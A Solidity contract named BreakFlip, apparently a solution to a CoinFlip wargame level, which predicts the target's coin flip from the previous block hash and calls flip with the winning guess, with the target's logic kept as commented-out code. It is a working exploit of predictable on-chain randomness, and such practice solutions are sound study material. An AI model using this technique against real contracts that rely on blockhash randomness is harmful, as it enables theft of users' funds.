// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

import "@openzeppelin/contracts/math/SafeMath.sol";
import "hardhat/console.sol";
import "./CoinFlip.sol";

contract BreakFlip {
    using SafeMath for uint256;
    address public coinFlip;
    uint256 FACTOR =
        57896044618658097711785492504343953926634992332820282019728792003956564819968;

    constructor(address _coinFlip) public {
        coinFlip = _coinFlip;
    }

    function smirk() public returns (bool) {
        uint256 blockValue = uint256(blockhash(block.number.sub(1)));

        uint256 coinflip = blockValue.div(FACTOR);
        bool side = coinflip == 1 ? true : false;
        CoinFlip(coinFlip).flip(side);
        uint256 cW = CoinFlip(coinFlip).consecutiveWins();
        console.log("consecutiveWins:", cW);
    }

    // function flip(bool _guess) public returns (bool) {
    //     uint256 blockValue = uint256(blockhash(block.number.sub(1)));
    //     console.log("blockNumber:", block.number);
    //     console.log("blockValue:", blockValue);
    //     console.log("FACTOR:", FACTOR);

    //     if (lastHash == blockValue) {
    //         revert();
    //     }

    //     lastHash = blockValue;
    //     uint256 coinFlip = blockValue.div(FACTOR);
    //     console.log("coinFlip:", coinFlip);
    //     console.log("---------------------------");
    //     bool side = coinFlip == 1 ? true : false;

    //     if (side == _guess) {
    //         consecutiveWins++;
    //         return true;
    //     } else {
    //         consecutiveWins = 0;
    //         return false;
    //     }
    // }
}
